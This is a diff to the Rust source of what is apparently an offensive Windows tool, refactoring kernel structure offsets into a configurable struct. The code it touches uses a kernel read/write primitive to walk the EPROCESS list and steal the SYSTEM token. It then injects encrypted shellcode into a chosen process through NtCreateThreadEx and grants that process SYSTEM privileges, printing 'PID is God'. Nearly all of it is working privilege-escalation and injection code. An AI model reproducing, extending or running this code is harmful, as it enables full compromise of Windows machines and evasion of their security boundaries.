@@ -8,10 +8,7 @@ use windows_sys::Win32::System::Threading::{
 };
 
 use crate::device::Device;
-use crate::eprocess::{
-    read_image_filename, EPROC_ACTIVE_LINKS, EPROC_TOKEN, EPROC_UNIQUE_PID,
-    TOKEN_SEP_ENABLED, TOKEN_SEP_PRESENT,
-};
+use crate::eprocess::{read_image_filename_with, EprocOffsets};
 use crate::kernel_rw::KernelRW;
 use crate::utils::{find_export_va, find_mod, get_kernel_modules, ntoskrnl_disk_path};
 
@@ -116,10 +113,11 @@ struct WalkResult {
 }
 
 fn walk_eprocess(
-    krw:        &KernelRW,
+    krw:          &KernelRW,
     system_eproc: u64,
-    our_pid:    u64,
-    target_pid: Option<u64>,
+    our_pid:      u64,
+    target_pid:   Option<u64>,
+    off:          &EprocOffsets,
 ) -> Result<WalkResult> {
     let mut our_eproc: Option<u64> = None;
     let mut candidates: Vec<(u64, u64)> = Vec::new();
@@ -138,7 +136,7 @@ fn walk_eprocess(
         log_debug(&format!("Iteration {}: current EPROCESS 0x{:016X}", iterations, current));
         log_debug("Calling krw.kread for EPROC_UNIQUE_PID...");
 
-        let pid = krw.kread(current + EPROC_UNIQUE_PID)?;
+        let pid = krw.kread(current + off.unique_pid)?;
         log_debug(&format!("Read PID: {}", pid));
 
         if pid == our_pid {
@@ -151,7 +149,7 @@ fn walk_eprocess(
             }
             None => {
                 if pid != our_pid {
-                    let name = read_image_filename(krw, current)?;
+                    let name = read_image_filename_with(krw, current, off)?;
                     if is_whitelisted(&name) {
                         candidates.push((pid, current));
                     }
@@ -160,10 +158,10 @@ fn walk_eprocess(
         }
 
         log_debug("Calling krw.kread for EPROC_ACTIVE_LINKS flink...");
-        let flink = krw.kread(current + EPROC_ACTIVE_LINKS)?;
+        let flink = krw.kread(current + off.active_links)?;
         log_debug(&format!("Read flink: 0x{:016X}", flink));
         if flink < 0xFFFF_8000_0000_0000 { bail!("invalid flink 0x{:016X}", flink); }
-        let next = flink.wrapping_sub(EPROC_ACTIVE_LINKS);
+        let next = flink.wrapping_sub(off.active_links);
         if next == system_eproc || next == 0 { 
             log_debug("Reached end of EPROCESS list.");
             break; 
@@ -178,11 +176,17 @@ fn walk_eprocess(
     })
 }
 
-fn escalate_eproc(krw: &KernelRW, eproc: u64, sys_present: u64, sys_enabled: u64) -> Result<()> {
-    let token_ref = krw.kread(eproc + EPROC_TOKEN)?;
+fn escalate_eproc(
+    krw: &KernelRW,
+    eproc: u64,
+    sys_present: u64,
+    sys_enabled: u64,
+    off: &EprocOffsets,
+) -> Result<()> {
+    let token_ref = krw.kread(eproc + off.token)?;
     let token = token_ref & !0xF;
-    krw.kwrite(token + TOKEN_SEP_PRESENT, sys_present)?;
-    krw.kwrite(token + TOKEN_SEP_ENABLED, sys_enabled)?;
+    krw.kwrite(token + off.sep_present, sys_present)?;
+    krw.kwrite(token + off.sep_enabled, sys_enabled)?;
     Ok(())
 }
 
@@ -211,7 +215,7 @@ fn enable_debug_privilege() {
     }
 }
 
-pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
+pub fn cmd_inject(dev: &Device, target_pid: Option<u64>, off: &EprocOffsets) -> Result<()> {
     enable_debug_privilege();
     log_debug("cmd_inject started, SeDebugPrivilege requested");
     if SHELLCODE_ENC.is_empty() {
@@ -253,7 +257,7 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
 
     let our_pid = unsafe { GetCurrentProcessId() } as u64;
     log_debug(&format!("Walking EPROCESS, our PID={}, target_pid={:?}", our_pid, target_pid));
-    let walk    = walk_eprocess(&krw, system_eproc, our_pid, target_pid)?;
+    let walk    = walk_eprocess(&krw, system_eproc, our_pid, target_pid, off)?;
     log_debug(&format!("walk_eprocess done. our_eproc=0x{:016X}, target_eproc={:?}, candidates={}", 
         walk.our_eproc, walk.target_eproc, walk.candidates.len()));
 
@@ -275,11 +279,11 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     log_debug(&format!("Selected target process for injection: PID={}", final_pid));
 
     log_debug("Reading SYSTEM token privileges...");
-    let sys_token_ref = krw.kread(system_eproc + EPROC_TOKEN)?;
+    let sys_token_ref = krw.kread(system_eproc + off.token)?;
     let sys_token = sys_token_ref & !0xF;
-    let sys_present = krw.kread(sys_token + TOKEN_SEP_PRESENT)?;
-    let sys_enabled = krw.kread(sys_token + TOKEN_SEP_ENABLED)?;
-    let our_token_ptr_addr = walk.our_eproc + EPROC_TOKEN;
+    let sys_present = krw.kread(sys_token + off.sep_present)?;
+    let sys_enabled = krw.kread(sys_token + off.sep_enabled)?;
+    let our_token_ptr_addr = walk.our_eproc + off.token;
     let our_orig_token_ptr = krw.kread(our_token_ptr_addr)?;
     krw.kwrite(our_token_ptr_addr, sys_token_ref)?;
     let hproc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, final_pid as u32) };
@@ -353,7 +357,7 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     if st != 0 { bail!("NtCreateThreadEx failed: {st:x}"); }
     log_debug(&format!("NtCreateThreadEx success: thread handle {:?}", hthread));
 
-    escalate_eproc(&krw, target_eproc, sys_present, sys_present)?;
+    escalate_eproc(&krw, target_eproc, sys_present, sys_enabled, off)?;
     println!("[+] PID {} is God", final_pid);
 
     unsafe { CloseHandle(hthread); }
